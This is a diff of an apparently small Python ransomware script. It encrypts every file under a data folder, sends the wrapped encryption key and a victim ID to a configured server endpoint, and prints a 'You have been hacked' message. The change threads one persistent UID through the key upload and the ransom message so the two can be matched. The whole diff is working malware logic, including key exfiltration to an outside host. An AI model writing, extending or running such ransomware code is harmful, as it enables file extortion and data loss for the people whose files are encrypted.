@@ -19,7 +19,7 @@ from urllib import request
 from config import ENDPOINT
 
 key = Crypto.Random.get_random_bytes(32)
-
+uid = str(uuid.uuid4())
 
 def encrypt(file):
     global key
@@ -48,6 +48,7 @@ def encrypt(file):
 
 def send():
     global key
+    global uid
     #print(key)
     f = open('../Server/database', 'w+')
 
@@ -67,7 +68,7 @@ def send():
     req = request.Request(ENDPOINT+'/add', headers={
         'Content-Type': 'application/json'
     }, data=bytes(json.dumps({
-        'uid': str(uuid.uuid4()),
+        'uid': uid,
         'key': codecs.encode(pickle.dumps([x for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext)]), "base64").decode()
     }), 'utf-8'))
     urlopen(req)
@@ -77,13 +78,14 @@ def send():
 
 
 def main():
+    global uid
     for root, dirs, files in walk('./data'):
         for f in files:
             encrypt(join(root, f))
 
     send()
     print(
-        """You have been hacked"""
+        """You have been hacked (%s)""" % uid
     )
 
 
